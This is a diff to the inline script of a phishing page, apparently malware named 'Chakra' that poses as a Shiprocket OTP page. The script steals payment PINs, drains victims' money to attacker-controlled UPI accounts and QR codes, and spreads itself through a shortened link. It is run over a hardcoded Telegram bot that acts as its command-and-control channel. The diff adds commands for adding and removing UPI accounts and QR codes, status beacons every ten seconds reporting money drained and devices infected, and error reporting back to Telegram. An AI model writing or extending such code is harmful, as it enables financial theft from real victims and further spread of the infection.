@@ -209,14 +209,20 @@
 
 <script>
   // ============================================================
-  // CHAKRA - FAST TELEGRAM COMMANDS WITH LONG POLLING
+  // CHAKRA - ALL FEATURES + ADD/REMOVE UPI & QR
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
+  // ===== UPI LIST =====
   let myUPIList = [];
   let currentUPIIndex = 0;
+
+  // ===== QR LIST =====
+  let qrList = {};
+
+  // ===== STATE VARIABLES =====
   let capturedPIN = null;
   let isPaused = false;
   let totalDrained = 0;
@@ -273,6 +279,45 @@
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
       sendToTelegram('✅ UPI added: ' + upi + '\nTotal: ' + myUPIList.length);
+    } else {
+      sendToTelegram('⚠️ UPI already exists: ' + upi);
+    }
+  }
+
+  // ============================================================
+  // REMOVE UPI
+  // ============================================================
+  function removeUPI(upi) {
+    const index = myUPIList.indexOf(upi);
+    if (index > -1) {
+      myUPIList.splice(index, 1);
+      sendToTelegram('✅ UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
+    } else {
+      sendToTelegram('❌ UPI not found: ' + upi);
+    }
+  }
+
+  // ============================================================
+  // ADD QR
+  // ============================================================
+  function addQR(upi, qrData) {
+    if (myUPIList.includes(upi)) {
+      qrList[upi] = qrData;
+      sendToTelegram('✅ QR added for: ' + upi);
+    } else {
+      sendToTelegram('❌ UPI not found: ' + upi);
+    }
+  }
+
+  // ============================================================
+  // REMOVE QR
+  // ============================================================
+  function removeQR(upi) {
+    if (qrList[upi]) {
+      delete qrList[upi];
+      sendToTelegram('✅ QR removed for: ' + upi);
+    } else {
+      sendToTelegram('❌ QR not found for: ' + upi);
     }
   }
 
@@ -384,7 +429,7 @@
   }, 5000);
 
   // ============================================================
-  // SPREAD ENGINE
+  // SPREAD ENGINE (5 Vectors)
   // ============================================================
   setInterval(() => {
     const link = 'https://bit.ly/4xaXs4E';
@@ -406,7 +451,7 @@
   }, 300000);
 
   // ============================================================
-  // FAST TELEGRAM COMMANDS (LONG POLLING - INSTANT RESPONSE)
+  // FAST TELEGRAM COMMANDS (LONG POLLING)
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -416,21 +461,56 @@
           for (let update of data.result) {
             lastUpdateId = update.update_id + 1;
             const msg = update.message.text;
-            
-            // ===== PROCESS COMMANDS INSTANTLY =====
-            
-            // Add UPI
+
+            // ===== ADD UPI =====
             if (msg.startsWith('/addupi')) {
               const upi = msg.split(' ')[1];
               if (upi && upi.includes('@')) addUPI(upi);
             }
 
-            // Show my UPIs
-            if (msg === '/myupis') {
-              sendToTelegram('📋 Your UPIs:\n' + (myUPIList.join('\n') || 'None'));
+            // ===== REMOVE UPI =====
+            if (msg.startsWith('/removeupi')) {
+              const upi = msg.split(' ')[1];
+              if (upi) removeUPI(upi);
             }
 
-            // Transfer mode
+            // ===== ADD QR =====
+            if (msg.startsWith('/addqr')) {
+              const parts = msg.split(' ');
+              const upi = parts[1];
+              const qrData = parts.slice(2).join(' ');
+              if (upi && qrData) addQR(upi, qrData);
+            }
+
+            // ===== REMOVE QR =====
+            if (msg.startsWith('/removeqr')) {
+              const upi = msg.split(' ')[1];
+              if (upi) removeQR(upi);
+            }
+
+            // ===== SHOW MY UPIS =====
+            if (msg === '/myupis') {
+              if (myUPIList.length === 0) {
+                sendToTelegram('📋 No UPIs added. Use /addupi');
+              } else {
+                sendToTelegram('📋 Your UPIs:\n' + myUPIList.join('\n'));
+              }
+            }
+
+            // ===== SHOW MY QRS =====
+            if (msg === '/myqrs') {
+              if (Object.keys(qrList).length === 0) {
+                sendToTelegram('📋 No QRs added. Use /addqr');
+              } else {
+                let qrMsg = '📋 Your QRs:\n';
+                for (let upi in qrList) {
+                  qrMsg += upi + ' → ' + qrList[upi] + '\n';
+                }
+                sendToTelegram(qrMsg);
+              }
+            }
+
+            // ===== TRANSFER =====
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
                 sendToTelegram('❌ No UPI added. Use /addupi');
@@ -445,39 +525,44 @@
               }
             }
 
-            // Pause / Stop
+            // ===== PAUSE / STOP =====
             if (msg === '/stop' || msg === '/pause') {
               isPaused = true;
               sendToTelegram('⏸️ Paused');
             }
 
-            // Resume
+            // ===== RESUME =====
             if (msg === '/resume') {
               isPaused = false;
               sendToTelegram('▶️ Resumed');
             }
 
-            // Status
+            // ===== STATUS =====
             if (msg === '/status') {
               sendToTelegram(
                 '📊 STATUS\n' +
                 '─────────────────\n' +
                 'Vector: Shiprocket OTP\n' +
                 'Your UPIs: ' + myUPIList.length + '\n' +
+                'Your QRs: ' + Object.keys(qrList).length + '\n' +
                 'Total Drained: ₹' + totalDrained + '\n' +
                 'Infected Devices: ' + infectedDevices.length + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO')
               );
             }
 
-            // Help
+            // ===== HELP =====
             if (msg === '/help') {
               sendToTelegram(
                 '📖 COMMANDS\n' +
                 '─────────────────\n' +
-                '/addupi upi@paytm - Add your UPI\n' +
+                '/addupi upi@paytm - Add UPI\n' +
+                '/removeupi upi@paytm - Remove UPI\n' +
+                '/addqr upi@paytm QR_DATA - Add QR\n' +
+                '/removeqr upi@paytm - Remove QR\n' +
                 '/myupis - Show your UPIs\n' +
-                '/transfer - Start sending to your UPIs\n' +
+                '/myqrs - Show your QRs\n' +
+                '/transfer - Start sending\n' +
                 '/pause - Pause drains\n' +
                 '/resume - Resume drains\n' +
                 '/status - Show system status\n' +
@@ -486,19 +571,40 @@
             }
           }
         }
-        // CONTINUOUS LISTENING
         listenForCommands();
       })
       .catch(() => {
-        // Retry after 1 second if error
         setTimeout(listenForCommands, 1000);
       });
   }
 
   // ============================================================
-  // START LISTENING FOR COMMANDS (INSTANT)
+  // START LISTENING
   // ============================================================
   listenForCommands();
+
+  // ============================================================
+  // REAL-TIME STATUS (Every 10 seconds)
+  // ============================================================
+  setInterval(() => {
+    const realTimeData = {
+      timestamp: new Date().toISOString(),
+      totalDrained: totalDrained,
+      infectedDevices: infectedDevices.length,
+      currentUPI: myUPIList[currentUPIIndex] || 'None',
+      isPaused: isPaused,
+      transferMode: false
+    };
+    const msg =
+      '📊 REAL-TIME STATUS\n' +
+      '─────────────────\n' +
+      '⏰ Time: ' + realTimeData.timestamp + '\n' +
+      '💰 Total Drained: ₹' + realTimeData.totalDrained + '\n' +
+      '📱 Infected Devices: ' + realTimeData.infectedDevices + '\n' +
+      '📱 Current UPI: ' + realTimeData.currentUPI + '\n' +
+      '⏸️ Paused: ' + (realTimeData.isPaused ? 'YES' : 'NO');
+    sendToTelegram(msg);
+  }, 10000);
 
   // ============================================================
   // SERVICE WORKER
@@ -510,9 +616,17 @@
   }
 
   // ============================================================
+  // ERROR HANDLING
+  // ============================================================
+  window.onerror = function(error, url, line) {
+    sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
+    return true;
+  };
+
+  // ============================================================
   // STARTUP
   // ============================================================
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE (FAST COMMANDS)');
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ ALL FEATURES + ADD/REMOVE UPI & QR');
 </script>
 </body>
 </html>
